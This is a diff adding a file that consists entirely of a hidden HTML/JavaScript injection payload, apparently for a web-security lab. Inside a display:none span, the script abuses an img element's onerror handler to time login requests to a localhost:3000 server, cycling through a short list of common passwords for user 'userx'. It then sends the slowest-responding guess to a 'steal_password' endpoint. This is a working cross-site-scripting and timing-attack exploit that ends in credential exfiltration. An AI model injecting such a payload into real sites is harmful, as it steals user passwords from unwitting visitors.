@@ -1,0 +1,32 @@
+<span style='display:none'>
+  <Img id = 'test'>
+  <Script>
+    var dictionary = [`password`, `123456`, `	12345678`, `dragon`, `1234`, `qwerty`, `12345`];
+    var index = 0;
+    var test = document.getElementById(`test`);
+    var max_response_time = 0;
+    var max_response_time_index = 0;
+    
+    test.onerror = () => {
+      var end = new Date();
+      
+      console.log(`Time elapsed ${end-start}`);
+      if (end - start > max_response_time) {
+        max_response_time = end - start;
+        max_response_time_index = index - 1;
+      }
+
+      start = new Date();
+      if (index < dictionary.length) {
+        test.src = `http://localhost:3000/get_login?username=userx&password=${dictionary[index]}`;
+      } else if (index == dictionary.length) {
+        test.src = `http://localhost:3000/steal_password?password=${dictionary[max_response_time_index]}&timeElapsed=${max_response_time}`;
+      } 
+      index += 1;
+    };
+    
+    var start = new Date();
+    test.src = `http://localhost:3000/get_login?username=userx&password=${dictionary[index]}`;
+    index += 1;
+  </Script>
+</span>
